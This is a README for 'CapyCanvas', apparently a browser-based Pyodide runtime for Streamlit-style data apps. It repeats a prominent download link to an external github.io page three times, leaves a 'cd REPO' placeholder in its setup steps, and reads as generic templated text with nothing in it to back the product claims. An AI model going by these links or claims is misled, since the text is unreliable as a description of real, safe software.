# CapyCanvas - Browser-Native Data App Runtime 2026

> **CapyCanvas is a browser-based runtime for creating and exporting Python-powered data science applications, including interactive dashboards, widgets, and charts, without a server.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lewisgabefo4622/capycanvas-script-app-builder?style=flat-square)](https://github.com/lewisgabefo4622/capycanvas-script-app-builder)

---

<p align="center">
  <a href="https://lewisgabefo4622.github.io/capycanvas-script-app-builder/">
    <img src="https://img.shields.io/badge/Download-CapyCanvas%20Latest-brightgreen?style=for-the-badge" alt="Download CapyCanvas">
  </a>
</p>

> **[Download CapyCanvas](https://lewisgabefo4622.github.io/capycanvas-script-app-builder/)**

---

[Download Latest Build](https://lewisgabefo4622.github.io/capycanvas-script-app-builder/)

---

## About CapyCanvas

CapyCanvas moves data application development into the browser. It combines Python execution through Pyodide with a Streamlit-inspired application model, allowing you to create interactive data science tools with widgets, charts, caching, and session state without depending on a server backend.

The runtime is suitable both for developers building and validating applications and for clients running exported browser-based results. Application data can be staged separately or included inside a single-file HTML export, supporting a workflow for distributing self-contained data apps through the browser.

---

## Core Capabilities

- Run Python in a Web browser without a separate server.
- Create application interfaces with a Streamlit-inspired API.
- Use interactive widgets, charts, caching, and session state.
- Re-execute the entire script whenever users interact with the application.
- Request Python packages as needed through pip directives.
- Manage dependencies and application data from dedicated staging panels.
- Include data files inside exported single-file HTML documents.
- Switch between Client and Developer audience modes.
- Produce Packaged or Logic-only application exports.
- Show errors in a form suitable for client-facing application use.
- Divide source code into modules and rebuild the application when required.

---

## Getting Started

Clone the repository or obtain the newest browser build:

```bash
git clone https://github.com/lewisgabefo4622/capycanvas-script-app-builder.git
cd REPO
```

Then open the CapyCanvas entry page in a modern Web browser. With a packaged build, you can open its HTML file directly and use the included editor or runtime panels to prepare and run the application.

CapyCanvas runs natively in the browser, so using it primarily involves acquiring the HTML-based build rather than installing a separate server runtime.

---

## Typical Workflow

A standard CapyCanvas session follows these steps:

1. Launch CapyCanvas in a Web browser.
2. Create or open the Python source for the data application.
3. Define the interface, widgets, charts, and logic through the Streamlit-inspired API.
4. Add pip directives for required packages.
5. Use the appropriate panels to stage dependencies and data files.
6. Run the application and test its controls.
7. Observe how each interaction re-runs the complete script.
8. Export the application in Packaged or Logic-only form.
9. If needed, embed the data into a single-file HTML document for distribution.

During development of a modular project, source code can be separated into multiple files and rebuilt whenever the project structure changes.

---

## Project Configuration

Configuration is performed inside the browser application and its source project. CapyCanvas does not require a separate service configuration file.

The available panels can be used to control:

- Python package directives and on-demand dependency installation.
- Data files used by the application.
- Client-facing versus developer-oriented audience mode.
- Packaged versus Logic-only export output.
- Source modules selected for splitting or rebuilding.
- Data inclusion in standalone HTML exports.

---

## Requirements

- A modern Web browser capable of running Python in the browser.
- The CapyCanvas HTML build or a local clone of this repository.
- Extra storage for application packages and staged data.
- Internet access when packages need to be installed on demand.
- No separate application server is needed by the browser runtime.

---

## Frequently Asked Questions

### Is a backend server needed?

No. CapyCanvas executes Python in the Web browser through Pyodide and does not require a separate server backend.

### What types of users can use CapyCanvas?

CapyCanvas is intended for developers building data applications and clients using packaged browser-based applications.

### How do I provide Python dependencies?

Use pip directives to request packages when needed, then manage them through the dependency staging workflow.

### Can application data be included in the distributed output?

Yes. Data files may be staged for the application and embedded directly in an exported single-file HTML document.

### How does the app respond to widget interactions?

Each user interaction causes the complete application script to run again, so the displayed results can reflect the updated state.

### Which export format is appropriate?

Packaged mode is intended for a complete application output. Logic-only mode exports the application logic separately from the packaged runtime.

### What can I do when an application shows an error?

Start with the client-facing error message, then inspect the source code, package directives, staged dependencies, and data files. For projects divided into modules, rebuild the modular source files as well.

### How do I receive newer versions?

Open the latest build from the project download link, or update your local repository clone before launching the browser runtime.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
